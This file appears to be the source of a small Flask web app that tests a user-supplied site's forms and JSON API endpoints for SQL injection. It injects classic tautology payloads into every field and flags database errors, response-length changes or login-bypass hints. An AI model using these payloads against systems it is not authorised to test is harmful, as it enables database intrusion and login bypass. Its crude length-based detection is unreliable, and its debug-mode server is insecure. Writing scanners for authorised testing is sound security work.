from flask import Flask, render_template, request
import requests
from bs4 import BeautifulSoup
import time
import json

app = Flask(__name__)

payloads = [
    "' OR '1'='1",
    "' OR 1=1--",
    '" OR ""="',
    "' OR 'a'='a"
]

sql_errors = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark",
    "sql syntax",
    "mysql_fetch"
]

# ---------------- FORM SCANNER ---------------- #

def get_forms(url):
    try:
        res = requests.get(url)
        soup = BeautifulSoup(res.text, "html.parser")
        return soup.find_all("form")
    except:
        return []


def scan_forms(url):
    results = []
    forms = get_forms(url)

    if not forms:
        return [{"type": "error", "msg": "❌ No forms found"}]

    for i, form in enumerate(forms):
        action = form.attrs.get("action", "")
        method = form.attrs.get("method", "get").lower()
        inputs = form.find_all("input")

        data = {}

        for inp in inputs:
            name = inp.attrs.get("name")
            if name:
                data[name] = "test123"

        target = url + action

        try:
            normal = requests.post(target, data=data) if method == "post" else requests.get(target, params=data)
            normal_text = normal.text
        except:
            results.append({"type": "error", "msg": f"Form {i+1}: Connection failed"})
            continue

        for key in data:
            for payload in payloads:
                temp = data.copy()
                temp[key] = payload

                try:
                    res = requests.post(target, data=temp) if method == "post" else requests.get(target, params=temp)
                    text = res.text.lower()

                    if any(err in text for err in sql_errors):
                        results.append({"type": "high", "msg": f"[Form {i+1}] SQL error in '{key}'"})

                    elif len(text) != len(normal_text):
                        results.append({"type": "medium", "msg": f"[Form {i+1}] Response changed in '{key}'"})

                    else:
                        results.append({"type": "safe", "msg": f"[Form {i+1}] Safe: '{key}'"})

                    time.sleep(0.3)

                except:
                    results.append({"type": "error", "msg": f"[Form {i+1}] Request failed"})

    return results


# ---------------- API SCANNER ---------------- #

def scan_api(url, method, json_data):
    results = []

    headers = {"Content-Type": "application/json"}

    try:
        normal_res = requests.request(method, url, json=json_data, headers=headers)
        normal_text = normal_res.text
    except:
        return [{"type": "error", "msg": "❌ API connection failed"}]

    for key in json_data:
        for payload in payloads:
            temp = json_data.copy()
            temp[key] = payload

            try:
                res = requests.request(method, url, json=temp, headers=headers)
                text = res.text.lower()

                if any(err in text for err in sql_errors):
                    results.append({"type": "high", "msg": f"[API] SQL error in '{key}'"})

                elif len(res.text) != len(normal_text):
                    results.append({"type": "medium", "msg": f"[API] Response changed in '{key}'"})

                elif "token" in text or "welcome" in text:
                    results.append({"type": "critical", "msg": f"[API] Possible login bypass in '{key}'"})

                else:
                    results.append({"type": "safe", "msg": f"[API] Safe: '{key}'"})

                time.sleep(0.3)

            except:
                results.append({"type": "error", "msg": f"[API] Request failed"})

    return results


# ---------------- ROUTE ---------------- #

@app.route("/", methods=["GET", "POST"])
def index():
    results = []

    if request.method == "POST":
        mode = request.form.get("mode")

        if mode == "form":
            url = request.form.get("url")
            if url:
                results = scan_forms(url)
            else:
                results = [{"type": "error", "msg": "URL missing"}]

        elif mode == "api":
            url = request.form.get("api_url")
            method = request.form.get("api_method")

            try:
                json_data = json.loads(request.form.get("api_body"))
                results = scan_api(url, method, json_data)
            except:
                results = [{"type": "error", "msg": "Invalid JSON"}]

        else:
            results = [{"type": "error", "msg": "Mode not selected"}]

    return render_template("index.html", results=results)


if __name__ == "__main__":
    app.run(debug=True)